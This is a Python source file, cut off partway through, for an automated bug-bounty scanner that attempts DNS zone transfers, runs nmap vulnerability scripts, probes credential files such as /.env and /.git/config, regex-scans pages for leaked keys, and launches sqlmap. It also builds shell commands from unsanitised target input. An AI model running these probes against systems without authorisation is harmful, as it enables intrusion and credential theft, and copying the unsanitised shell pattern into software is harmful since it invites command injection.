#!/usr/bin/env python3
# ============================================================
#   gh0stfind3r v3.0 - Automated Bug Bounty Hunting Framework
#   Author  : GHOST BEROK
#   Purpose : Bug Bounty / Ethical Hacking / Recon
#   GitHub  : Made for the community 🔥
# ============================================================

import subprocess, sys, os, re, json, socket, ssl, time
import threading, argparse, hashlib, random, string
import urllib.request, urllib.parse, urllib.error, http.client
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"
    BLINK   = "\033[5m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def blue(s):   return f"{C.BLUE}{s}{C.RESET}"
def mag(s):    return f"{C.MAGENTA}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"
def dim(s):    return f"{C.DIM}{s}{C.RESET}"

# ─────────────────────────────────────────────
#  GLOBAL FINDINGS TRACKER
# ─────────────────────────────────────────────
FINDINGS = {
    "CRITICAL": [],
    "HIGH":     [],
    "MEDIUM":   [],
    "LOW":      [],
    "INFO":     [],
}
SCAN_START = datetime.now()
LOG_FILE   = None

def add_finding(severity, title, detail=""):
    FINDINGS[severity].append({"title": title, "detail": detail, "time": datetime.now().strftime("%H:%M:%S")})

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
def print_banner():
    print(f"""
{C.RED}{C.BOLD}
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║  ███╗███████║██║   ██║███████╗   ██║
██║   ██║██╔══██║██║   ██║╚════██║   ██║
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝{C.RESET}
{C.CYAN}{C.BOLD}███████╗██╗███╗   ██╗██████╗ ██████╗ ██████╗
██╔════╝██║████╗  ██║██╔══██╗╚════██╗██╔══██╗
█████╗  ██║██╔██╗ ██║██║  ██║ █████╔╝██████╔╝
██╔══╝  ██║██║╚██╗██║██║  ██║ ╚═══██╗██╔══██╗
██║     ██║██║ ╚████║██████╔╝██████╔╝██║  ██║
╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═════╝ ╚═╝  ╚═╝{C.RESET}

{C.YELLOW}╔══════════════════════════════════════════════════════════╗{C.RESET}
{C.YELLOW}║  {C.WHITE}{C.BOLD}gh0stfind3r v3.0{C.RESET}{C.YELLOW}  |  {C.GREEN}By GHOST BEROK{C.YELLOW}               ║{C.RESET}
{C.YELLOW}║  {C.CYAN}20+ Module Automated Bug Bounty Framework{C.YELLOW}            ║{C.RESET}
{C.YELLOW}║  {C.MAGENTA}Use only on authorized targets. Ethical hacking only.{C.YELLOW} ║{C.RESET}
{C.YELLOW}╚══════════════════════════════════════════════════════════╝{C.RESET}
""")

# ─────────────────────────────────────────────
#  LOGGING
# ─────────────────────────────────────────────
def _write_log(raw):
    if LOG_FILE:
        clean = re.sub(r'\033\[[0-9;]*m', '', raw)
        with open(LOG_FILE, 'a') as f:
            f.write(clean + "\n")

def log(msg):
    ts = dim(f"[{datetime.now().strftime('%H:%M:%S')}]")
    line = f"{ts} {msg}"
    print(line)
    _write_log(line)

def section(title):
    bar = "═" * 58
    print(f"\n{C.YELLOW}{bar}{C.RESET}")
    print(f"{C.YELLOW}  ▶  {C.BOLD}{C.WHITE}{title.upper()}{C.RESET}")
    print(f"{C.YELLOW}{bar}{C.RESET}")
    _write_log(f"\n=== {title.upper()} ===")

def ok(msg):
    log(f"{green('✔')} {msg}")

def warn(msg):
    log(f"{yellow('⚠')} {msg}")

def err(msg):
    log(f"{red('✘')} {msg}")

def info(msg):
    log(f"{cyan('ℹ')} {msg}")

def vuln(severity, msg):
    icons = {"CRITICAL": "💀", "HIGH": "🔥", "MEDIUM": "⚡", "LOW": "🔵"}
    colors = {"CRITICAL": C.RED+C.BOLD, "HIGH": C.RED, "MEDIUM": C.YELLOW, "LOW": C.CYAN}
    icon = icons.get(severity, "🔍")
    color = colors.get(severity, C.WHITE)
    line = f"  {icon} {color}[{severity}]{C.RESET} {msg}"
    print(line)
    _write_log(line)
    add_finding(severity, msg)

def tip(msg):
    log(f"{mag('💡 AI')} {msg}")

# ─────────────────────────────────────────────
#  SHELL RUNNER
# ─────────────────────────────────────────────
def run_cmd(cmd, timeout=120, silent=False):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip()
    except subprocess.TimeoutExpired:
        if not silent:
            warn(f"Timeout: {cmd[:60]}")
        return "", "TIMEOUT"
    except Exception as e:
        return "", str(e)

def tool_exists(name):
    out, _ = run_cmd(f"which {name}", silent=True)
    return bool(out)

def install_hint(tool, cmd=None):
    cmd = cmd or f"sudo apt install {tool} -y"
    warn(f"{yellow(tool)} not found → {dim(cmd)}")

# ─────────────────────────────────────────────
#  HTTP HELPERS
# ─────────────────────────────────────────────
UA = "Mozilla/5.0 gh0stfind3r/3.0"

def http_get(url, timeout=8, headers=None, follow=True):
    try:
        h = {"User-Agent": UA}
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, headers=h)
        if not follow:
            opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
            with opener.open(req, timeout=timeout) as r:
                return r.getcode(), dict(r.getheaders()), r.read().decode("utf-8", errors="ignore")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), dict(r.getheaders()), r.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="ignore")
        except:
            body = ""
        return e.code, dict(e.headers), body
    except Exception:
        return 0, {}, ""

def http_post(url, data, timeout=8, content_type="application/x-www-form-urlencoded"):
    try:
        body = data.encode() if isinstance(data, str) else data
        req = urllib.request.Request(url, data=body, method="POST",
                                     headers={"User-Agent": UA, "Content-Type": content_type})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), dict(r.getheaders()), r.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="ignore")
        except:
            body = ""
        return e.code, dict(e.headers), body
    except:
        return 0, {}, ""

# ─────────────────────────────────────────────
#  PARSE TARGET
# ─────────────────────────────────────────────
def parse_target(raw):
    raw = raw.strip()
    ip_pat = re.compile(r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$')
    if ip_pat.match(raw):
        return f"http://{raw}", raw.split(":")[0], raw.split(":")[0]
    if not raw.startswith("http"):
        raw = "https://" + raw
    parsed = urllib.parse.urlparse(raw)
    domain = (parsed.netloc or parsed.path).split(":")[0]
    try:
        ip = socket.gethostbyname(domain)
    except:
        ip = "unknown"
    return raw, domain, ip

# ─────────────────────────────────────────────
#  PROGRESS BAR
# ─────────────────────────────────────────────
def progress_bar(current, total, label="", width=30):
    pct = int((current / max(total, 1)) * 100)
    filled = int(width * current / max(total, 1))
    bar = "█" * filled + "░" * (width - filled)
    color = C.GREEN if pct > 66 else C.YELLOW if pct > 33 else C.RED
    print(f"\r  {color}{bar}{C.RESET} {pct:3d}% {dim(label)}", end="", flush=True)
    if current >= total:
        print()

# ─────────────────────────────────────────────
#  MODULE 1 – WHOIS / DNS
# ─────────────────────────────────────────────
def module_whois(domain, ip):
    section("WHOIS & DNS Recon")
    info(f"Target: {bold(domain)}  IP: {bold(ip)}")

    if tool_exists("whois"):
        out, _ = run_cmd(f"whois {domain}", timeout=30)
        for line in out.splitlines()[:40]:
            if any(k in line.lower() for k in ["registrar","created","expir","name server","org","country","email"]):
                ok(line.strip())
    else:
        install_hint("whois")

    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
        out, _ = run_cmd(f"dig +short {rtype} {domain}", silent=True)
        if out:
            ok(f"DNS {rtype}: {cyan(out[:200])}")

    out, _ = run_cmd(f"dig +short -x {ip}", silent=True)
    if out:
        ok(f"Reverse DNS: {cyan(out)}")

    # Zone transfer attempt
    info("Attempting DNS zone transfer (AXFR)...")
    ns_out, _ = run_cmd(f"dig +short NS {domain}", silent=True)
    for ns in ns_out.splitlines()[:3]:
        ns = ns.strip().rstrip(".")
        if ns:
            zt, _ = run_cmd(f"dig axfr {domain} @{ns}", timeout=10, silent=True)
            if zt and "Transfer failed" not in zt and len(zt) > 100:
                vuln("CRITICAL", f"DNS Zone Transfer allowed via {ns}!")
                info(zt[:500])
            else:
                ok(f"Zone transfer refused on {ns}")

    # SPF / DMARC / DKIM
    for check in [f"dig +short TXT {domain}", f"dig +short TXT _dmarc.{domain}"]:
        out, _ = run_cmd(check, silent=True)
        if out:
            if "v=spf1" in out.lower():
                if "~all" in out:
                    warn("SPF uses softfail (~all) — email spoofing partially possible")
                elif "-all" in out:
                    ok("SPF configured with hard fail (-all)")
                else:
                    vuln("MEDIUM", "SPF missing or weak — email spoofing may be possible")
            if "v=DMARC1" in out:
                ok(f"DMARC record found: {out[:100]}")
            else:
                if "_dmarc" in check:
                    vuln("MEDIUM", "No DMARC record — email spoofing risk")

    # CDN/WAF detection
    waf_map = {"cloudflare":"Cloudflare","akamai":"Akamai","fastly":"Fastly","sucuri":"Sucuri",
                "incapsula":"Imperva","aws":"AWS","azure":"Azure","google":"Google Cloud"}
    out, _ = run_cmd(f"dig +short {domain}", silent=True)
    for key, name in waf_map.items():
        if key in out.lower():
            warn(f"Behind {yellow(name)} CDN/WAF — some active scans may be blocked")
            add_finding("INFO", f"CDN/WAF detected: {name}")

# ─────────────────────────────────────────────
#  MODULE 2 – SUBDOMAIN ENUMERATION
# ─────────────────────────────────────────────
def module_subdomains(domain):
    section("Subdomain Enumeration")
    found = set()

    # subfinder
    if tool_exists("subfinder"):
        info("Running subfinder...")
        out, _ = run_cmd(f"subfinder -d {domain} -silent", timeout=120)
        for s in out.splitlines():
            if s.strip():
                found.add(s.strip())
        ok(f"subfinder: {len(out.splitlines())} results")
    else:
        install_hint("subfinder", "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")

    # amass passive
    if tool_exists("amass"):
        info("Running amass (passive)...")
        out, _ = run_cmd(f"amass enum -passive -d {domain} -timeout 2", timeout=150)
        for s in out.splitlines():
            if domain in s:
                found.add(s.strip())

    # assetfinder
    if tool_exists("assetfinder"):
        out, _ = run_cmd(f"assetfinder --subs-only {domain}", timeout=60)
        for s in out.splitlines():
            if s.strip():
                found.add(s.strip())

    # crt.sh
    info("Querying crt.sh...")
    try:
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
            for entry in data:
                for sub in entry.get("name_value", "").splitlines():
                    sub = sub.strip().lstrip("*.")
                    if domain in sub:
                        found.add(sub)
        ok(f"crt.sh: {len(found)} total after cert logs")
    except Exception as e:
        warn(f"crt.sh: {e}")

    # Resolve and check alive
    alive = []
    if found:
        info(f"Resolving {len(found)} subdomains...")
        def resolve(sub):
            try:
                ip = socket.gethostbyname(sub)
                return sub, ip
            except:
                return sub, None

        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(resolve, s): s for s in found}
            for i, fut in enumerate(as_completed(futures)):
                progress_bar(i+1, len(found), "resolving")
                sub, ip = fut.result()
                if ip:
                    alive.append(sub)

        section("Live Subdomains")
        for sub in sorted(alive):
            try:
                ip_addr = socket.gethostbyname(sub)
                ok(f"{green(sub):<55} → {cyan(ip_addr)}")
            except:
                pass

        # Subdomain takeover check
        section("Subdomain Takeover Check")
        takeover_signatures = {
            "github.io":          "There isn't a GitHub Pages site here",
            "s3.amazonaws.com":   "NoSuchBucket",
            "azurewebsites.net":  "404 Web Site not found",
            "herokuapp.com":      "No such app",
            "ghost.io":           "The thing you were looking for is no longer here",
            "netlify.app":        "Not Found",
            "surge.sh":           "project not found",
            "readme.io":          "Project doesnt exist",
            "fastly":             "Fastly error: unknown domain",
            "shopify":            "Sorry, this shop is currently unavailable",
            "cargo.site":         "404 Not Found",
        }
        for sub in alive[:30]:
            code, _, body = http_get(f"https://{sub}", timeout=5)
            for sig_domain, sig_text in takeover_signatures.items():
                if sig_text.lower() in body.lower():
                    vuln("HIGH", f"Subdomain Takeover possible! {sub} → {sig_text[:40]}")
                    break
            # CNAME to dead service
            cname_out, _ = run_cmd(f"dig +short CNAME {sub}", silent=True)
            if cname_out:
                for sig in takeover_signatures:
                    if sig in cname_out:
                        vuln("HIGH", f"Dangling CNAME: {sub} → {cname_out} (possible takeover)")

        ok(f"Subdomain takeover scan complete")
    return alive

# ─────────────────────────────────────────────
#  MODULE 3 – PORT SCANNING
# ─────────────────────────────────────────────
def module_portscan(ip, domain):
    section("Port Scanning")
    open_ports = []

    if not tool_exists("nmap"):
        install_hint("nmap")
        return open_ports

    info(f"Scanning top 1000 ports on {bold(ip)}...")
    out, _ = run_cmd(f"nmap -sV -T4 --open -Pn {ip} --top-ports 1000", timeout=240)
    for line in out.splitlines():
        if "/tcp" in line and "open" in line:
            ok(line.strip())
            m = re.search(r'(\d+)/tcp', line)
            if m:
                port = int(m.group(1))
                open_ports.append(port)

    # Service-specific NSE scripts
    if open_ports:
        ports_str = ",".join(map(str, open_ports))
        info("Running NSE service scripts...")
        out2, _ = run_cmd(
            f"nmap -sV -sC --script=banner,http-title,ssl-cert,smtp-open-relay,"
            f"ftp-anon,ssh-auth-methods,http-robots.txt -p {ports_str} -Pn {ip}",
            timeout=180
        )
        for line in out2.splitlines():
            if "|" in line or "script" in line.lower():
                info(f"  {line.strip()}")

        # NSE vuln scripts
        vuln_ports = [p for p in open_ports if p in [21,22,23,25,80,443,445,3306,5432,6379,8080,8443,9200,27017]]
        if vuln_ports:
            info("Running vulnerability NSE scripts...")
            vp_str = ",".join(map(str, vuln_ports))
            out3, _ = run_cmd(f"nmap --script vuln -p {vp_str} -Pn {ip}", timeout=240)
            for line in out3.splitlines():
                if "VULNERABLE" in line or "CVE-" in line:
                    vuln("HIGH", line.strip())

    # Critical port findings
    critical_ports = {
        21: ("FTP", "HIGH", "FTP exposed – test anonymous login"),
        23: ("Telnet", "CRITICAL", "Telnet open – cleartext protocol, huge risk"),
        3306: ("MySQL", "CRITICAL", "MySQL directly internet-exposed"),
        5432: ("PostgreSQL", "HIGH", "PostgreSQL internet-exposed"),
        6379: ("Redis", "CRITICAL", "Redis often has no auth by default"),
        9200: ("Elasticsearch", "CRITICAL", "Elasticsearch – data often publicly readable"),
        27017: ("MongoDB", "CRITICAL", "MongoDB – check if auth is disabled"),
        2375: ("Docker API", "CRITICAL", "Docker daemon exposed – full host takeover"),
        5900: ("VNC", "HIGH", "VNC remote desktop exposed"),
        5984: ("CouchDB", "HIGH", "CouchDB – check for open _all_dbs endpoint"),
        11211: ("Memcached", "HIGH", "Memcached exposed – can be used for DDoS amplification"),
        2049: ("NFS", "HIGH", "NFS exposed – check for unauthenticated mounts"),
        8500: ("Consul", "HIGH", "HashiCorp Consul – check for unauthenticated API"),
        4848: ("GlassFish", "HIGH", "GlassFish admin panel exposed"),
        7001: ("WebLogic", "CRITICAL", "WebLogic – multiple critical RCE CVEs"),
        8161: ("ActiveMQ", "CRITICAL", "ActiveMQ – check for CVE-2023-46604 RCE"),
    }
    for port in open_ports:
        if port in critical_ports:
            svc, severity, desc = critical_ports[port]
            vuln(severity, f"Port {port} ({svc}): {desc}")

    return open_ports

# ─────────────────────────────────────────────
#  MODULE 4 – TECH FINGERPRINT
# ─────────────────────────────────────────────
def module_fingerprint(url, domain):
    section("Technology Fingerprinting")

    if tool_exists("whatweb"):
        out, _ = run_cmd(f"whatweb -a 3 --color=never {url}", timeout=30)
        if out:
            ok(f"WhatWeb: {out[:400]}")
    else:
        install_hint("whatweb")

    if tool_exists("wafw00f"):
        out, _ = run_cmd(f"wafw00f {url} -a", timeout=30)
        for line in out.splitlines():
            if "behind" in line or "No WAF" in line:
                ok(line.strip())
    else:
        install_hint("wafw00f")

    # Header grab
    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc or parsed.path
    try:
        conn_cls = http.client.HTTPSConnection if "https" in url else http.client.HTTPConnection
        conn = conn_cls(host, timeout=10)
        conn.request("GET", "/", headers={"User-Agent": UA})
        resp = conn.getresponse()
        ok(f"HTTP Status: {bold(str(resp.status))} {resp.reason}")
        raw_headers = dict(resp.getheaders())
        important = ["Server","X-Powered-By","X-Frame-Options","Content-Security-Policy",
                     "Strict-Transport-Security","X-XSS-Protection","X-Content-Type-Options",
                     "Access-Control-Allow-Origin","Set-Cookie","X-Runtime","Via",
                     "X-Generator","X-Drupal-Cache","X-Varnish","CF-Ray","X-Cache"]
        for h in important:
            v = raw_headers.get(h) or raw_headers.get(h.lower())
            if v:
                ok(f"  {cyan(h)}: {v[:150]}")
        conn.close()

        # Tech detection from headers
        srv = (raw_headers.get("Server") or "").lower()
        tech_hints = {
            "apache": "Apache web server detected",
            "nginx": "Nginx web server detected",
            "iis": "Microsoft IIS – check for CVE-based exploits",
            "php": "PHP detected – check for PHP-specific vulns",
            "express": "Node.js/Express backend",
            "django": "Django framework detected",
            "ruby": "Ruby on Rails detected",
        }
        for sig, msg in tech_hints.items():
            if sig in srv or sig in str(raw_headers).lower():
                info(f"Tech: {msg}")

        return raw_headers
    except Exception as e:
        err(f"Header grab failed: {e}")
        return {}

# ─────────────────────────────────────────────
#  MODULE 5 – SECURITY HEADER ANALYSIS
# ─────────────────────────────────────────────
def module_header_analysis(headers):
    section("Security Header Analysis")
    score = 0
    issues = []

    checks = {
        "Strict-Transport-Security": ("HSTS missing – HTTP downgrade possible", 15, "HIGH"),
        "X-Frame-Options":           ("Clickjacking possible", 15, "MEDIUM"),
        "X-Content-Type-Options":    ("MIME sniffing enabled", 10, "LOW"),
        "Content-Security-Policy":   ("CSP missing – XSS impact increased", 20, "HIGH"),
        "X-XSS-Protection":          ("X-XSS-Protection not set", 10, "LOW"),
        "Referrer-Policy":           ("Referrer leakage possible", 10, "LOW"),
        "Permissions-Policy":        ("Permissions-Policy missing", 10, "LOW"),
        "Cache-Control":             ("No Cache-Control – data may be cached", 10, "LOW"),
    }

    all_lower = {k.lower(): v for k, v in headers.items()}

    for header, (issue, pts, severity) in checks.items():
        if header.lower() in all_lower:
            score += pts
            ok(f"{green('✔')} {header} is set")
        else:
            issues.append((issue, pts, severity))
            vuln(severity, f"Missing header: {header} – {issue}")

    # CORS check
    cors = all_lower.get("access-control-allow-origin", "")
    if cors == "*":
        vuln("HIGH", "CORS: Access-Control-Allow-Origin: * — any site can read responses")
        issues.append(("CORS open wildcard", 20, "HIGH"))
    elif cors:
        ok(f"CORS restricted to: {cors}")

    # Cookie checks
    cookie = all_lower.get("set-cookie", "")
    if cookie:
        if "httponly" not in cookie.lower():
            vuln("HIGH", "Cookie missing HttpOnly — JavaScript can steal session")
        if "secure" not in cookie.lower():
            vuln("MEDIUM", "Cookie missing Secure flag — sent over plain HTTP")
        if "samesite" not in cookie.lower():
            vuln("MEDIUM", "Cookie missing SameSite — CSRF attack vector")

    # Check for info disclosure in Server header
    srv = all_lower.get("server", "")
    if re.search(r'[\d\.]{3,}', srv):
        vuln("LOW", f"Server version disclosed: {srv} — update or hide version")

    pct = int((score / 100) * 100)
    bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
    color = C.GREEN if pct >= 70 else C.YELLOW if pct >= 40 else C.RED
    print(f"\n  {bold('Security Score:')} {color}{bar}{C.RESET} {pct}%\n")

    return issues

# ─────────────────────────────────────────────
#  MODULE 6 – DIRECTORY DISCOVERY
# ─────────────────────────────────────────────
def module_directories(url):
    section("Directory & Endpoint Discovery")
    found_paths = []

    wordlists = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
    ]
    wl = next((w for w in wordlists if os.path.exists(w)), None)

    if tool_exists("ffuf") and wl:
        info(f"Running ffuf with wordlist...")
        out, _ = run_cmd(
            f"ffuf -u {url}/FUZZ -w {wl} -mc 200,201,204,301,302,403,405 "
            f"-t 50 -timeout 10 -s -of csv",
            timeout=240
        )
        for line in out.splitlines():
            if "," in line and line.strip():
                parts = line.split(",")
                if parts:
                    path = parts[0]
                    ok(f"Found: {cyan(path)}")
                    found_paths.append(path)
    elif tool_exists("gobuster") and wl:
        info("Running gobuster...")
        out, _ = run_cmd(f"gobuster dir -u {url} -w {wl} -t 50 -q --no-error", timeout=240)
        for line in out.splitlines():
            if "/" in line:
                ok(f"Found: {cyan(line.strip())}")
                found_paths.append(line.strip())
    else:
        warn("ffuf/gobuster not found – running built-in lightweight scanner")
        _builtin_dir_scan(url, found_paths)

    # Sensitive paths check
    sensitive = [
        "/.git/HEAD", "/.git/config", "/.env", "/.env.local", "/.env.production",
        "/config.php", "/wp-config.php", "/configuration.php", "/settings.php",
        "/admin", "/administrator", "/phpmyadmin", "/backup", "/db",
        "/.htaccess", "/.htpasswd", "/robots.txt", "/sitemap.xml",
        "/.DS_Store", "/thumbs.db", "/web.config", "/crossdomain.xml",
        "/api/v1", "/api/v2", "/api/v3", "/swagger.json", "/openapi.json",
        "/swagger-ui.html", "/api-docs", "/v1/docs", "/v2/docs",
        "/server-status", "/server-info", "/status", "/health", "/metrics",
        "/actuator", "/actuator/env", "/actuator/heapdump", "/actuator/mappings",
        "/debug", "/trace", "/console", "/shell",
        "/.svn/entries", "/.svn/wc.db",
        "/wp-content/debug.log", "/error.log", "/access.log",
        "/phpinfo.php", "/info.php", "/test.php",
        "/upload", "/uploads", "/files", "/file", "/documents",
        "/backup.zip", "/backup.tar.gz", "/dump.sql", "/db.sql",
        "/old", "/bak", "/.bak", "/temp", "/tmp",
    ]

    info(f"Checking {len(sensitive)} sensitive paths...")
    hits = []
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(http_get, url.rstrip("/")+p, 5): p for p in sensitive}
        for i, fut in enumerate(as_completed(futures)):
            progress_bar(i+1, len(sensitive), "scanning paths")
            p = futures[fut]
            try:
                code, hdrs, body = fut.result()
                if code in [200, 403, 401, 301, 302]:
                    full = url.rstrip("/") + p
                    if code == 200:
                        size = len(body)
                        if size > 0:
                            vuln("HIGH" if any(k in p for k in [".env",".git","backup","sql","phpinfo"]) else "MEDIUM",
                                 f"Accessible [{code}] {cyan(full)} ({size} bytes)")
                            hits.append(full)
                    elif code == 403:
                        warn(f"Forbidden [403]: {full} ← exists but locked")
                    elif code in [301, 302]:
                        loc = hdrs.get("Location", "")
                        ok(f"Redirect [{code}]: {full} → {loc}")
            except:
                pass

    return found_paths

def _builtin_dir_scan(url, results):
    common = ["admin","login","api","backup","config","uploads","images","js","css",
              "includes","wp-admin","wp-login.php","phpmyadmin","dashboard","panel",
              "cpanel","manage","portal","static","assets","files","data","db",
              "test","old","dev","staging","api/v1","api/v2","graphql"]
    for path in common:
        code, _, body = http_get(url.rstrip("/") + "/" + path, 5)
        if code in [200, 403]:
            msg = f"[{code}]: /{path}"
            if code == 200:
                vuln("MEDIUM", f"Accessible: /{path}")
            results.append(msg)

# ─────────────────────────────────────────────
#  MODULE 7 – JAVASCRIPT RECON & SECRET SCANNER
# ─────────────────────────────────────────────
def module_js_recon(url, domain):
    section("JavaScript Recon & Secret Scanner")

    if tool_exists("gau"):
        info("Running gau (GetAllUrls)...")
        out, _ = run_cmd(f"echo {domain} | gau --threads 10", timeout=120)
        lines = out.splitlines()
        js_files  = [l for l in lines if l.endswith(".js")]
        api_paths = [l for l in lines if "/api/" in l or "/v1/" in l or "/v2/" in l]
        params    = [l for l in lines if "?" in l]
        ok(f"gau: {len(lines)} URLs | {len(js_files)} JS | {len(api_paths)} API | {len(params)} w/params")
        for a in api_paths[:15]:
            info(f"  API: {cyan(a[:100])}")
    else:
        install_hint("gau", "go install github.com/lc/gau/v2/cmd/gau@latest")

    if tool_exists("waybackurls"):
        out, _ = run_cmd(f"echo {domain} | waybackurls", timeout=60)
        params = [l for l in out.splitlines() if "?" in l]
        ok(f"Wayback: {len(params)} parameterized URLs")
        for p in params[:10]:
            info(f"  {cyan(p[:100])}")
    else:
        install_hint("waybackurls", "go install github.com/tomnomnom/waybackurls@latest")

    # Secret scanning in HTML and JS files
    _scan_secrets(url)

def _scan_secrets(url):
    info("Scanning for exposed secrets in JS/HTML...")
    code, hdrs, html = http_get(url, 10)
    if not html:
        return

    # Find JS file URLs
    js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html)
    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)

    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    secret_patterns = {
        "AWS Access Key":    r'AKIA[0-9A-Z]{16}',
        "AWS Secret Key":    r'aws.{0,20}["\'][0-9a-zA-Z/+]{40}["\']',
        "Google API Key":    r'AIza[0-9A-Za-z_\-]{35}',
        "Stripe Live Key":   r'sk_live_[0-9a-zA-Z]{24,}',
        "Stripe Test Key":   r'sk_test_[0-9a-zA-Z]{24,}',
        "Slack Token":       r'xox[baprs]-[0-9a-zA-Z\-]{10,}',
        "GitHub Token":      r'gh[pousr]_[A-Za-z0-9]{36}',
        "JWT Token":         r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
        "Twilio SID":        r'AC[a-z0-9]{32}',
        "Firebase URL":      r'https://[a-z0-9-]+\.firebaseio\.com',
        "Heroku API Key":    r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
        "Private Key":       r'-----BEGIN [A-Z ]+ PRIVATE KEY-----',
        "Password in code":  r'(?i)password\s*[=:]\s*["\'][^"\']{6,}["\']',
        "API Key generic":   r'(?i)api[_-]?key\s*[=:]\s*["\'][A-Za-z0-9_\-]{16,}["\']',
        "Secret generic":    r'(?i)secret\s*[=:]\s*["\'][A-Za-z0-9_\-]{16,}["\']',
        "Bearer Token":      r'[Bb]earer\s+[A-Za-z0-9\-_\.]{20,}',
        "Mailgun Key":       r'key-[0-9a-zA-Z]{32}',
        "SendGrid Key":      r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}',
        "Telegram Bot Token":r'\d{9}:[a-zA-Z0-9_-]{35}',
        "Discord Token":     r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
        "Internal IP":       r'(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)\d+\.\d+',
    }

    def scan_text(text, source):
        for name, pattern in secret_patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                for m in matches[:2]:
                    m_str = str(m)[:60]
                    vuln("HIGH" if any(k in name for k in ["AWS","Stripe Live","Private"]) else "MEDIUM",
                         f"[{source}] {name}: {yellow(m_str)}")

    # Scan inline scripts
    for script in inline_scripts:
        scan_text(script, "inline-script")

    # Scan external JS files
    for js_url in js_urls[:15]:
        if not js_url.startswith("http"):
            js_url = base + "/" + js_url.lstrip("/")
        code2, _, js_body = http_get(js_url, 8)
        if js_body:
            scan_text(js_body, js_url.split("/")[-1][:30])

# ─────────────────────────────────────────────
#  MODULE 8 – PARAMETER DISCOVERY (ARJUN-LIKE)
# ─────────────────────────────────────────────
def module_param_discovery(url):
    section("Parameter Discovery")

    if tool_exists("arjun"):
        info("Running arjun parameter discovery...")
        out, _ = run_cmd(f"arjun -u {url} --quiet", timeout=120)
        for line in out.splitlines():
            if "Parameters" in line or "Found" in line:
                ok(line.strip())
        return

    # Built-in lightweight param fuzzer
    info("Built-in param fuzzer (no arjun found)...")
    params_to_test = [
        "id","user","username","email","name","page","file","path","url","redirect",
        "token","key","api_key","secret","password","query","search","q","term",
        "lang","format","type","action","cmd","exec","debug","admin","ref","return",
        "next","callback","jsonp","sort","order","limit","offset","filter","category",
        "tag","slug","hash","data","content","template","theme","view","layout",
    ]

    parsed = urllib.parse.urlparse(url)
    base_url = urllib.parse.urlunparse(parsed._replace(query=""))

    found_params = []
    code0, _, body0 = http_get(base_url, 8)
    baseline_len = len(body0)

    info(f"Testing {len(params_to_test)} common parameters...")
    for i, param in enumerate(params_to_test):
        progress_bar(i+1, len(params_to_test), param)
        test_url = f"{base_url}?{param}=gh0sttest123"
        code, _, body = http_get(test_url, 5)
        diff = abs(len(body) - baseline_len)
        if diff > 50 or code != code0:
            ok(f"Possible param: {cyan(param)} (response changed by {diff} bytes, code {code})")
            found_params.append(param)
    print()

    if found_params:
        tip(f"Found {len(found_params)} parameters – test for SQLi/XSS/SSRF: {found_params}")

# ─────────────────────────────────────────────
#  MODULE 9 – SQL INJECTION
# ─────────────────────────────────────────────
def module_sqli(url, domain):
    section("SQL Injection Testing")

    if tool_exists("sqlmap"):
        info("Running sqlmap...")
        out, _ = run_cmd(
            f"sqlmap -u {url} --crawl=2 --level=2 --risk=1 --batch --forms "
            f"--output-dir=/tmp/gh0st_sqlmap --threads=4 -q",
            timeout=300
        )
        for line in out.splitlines():
            if "vulnerable" in line.lower() or "sqlmap identified" in line.lower():
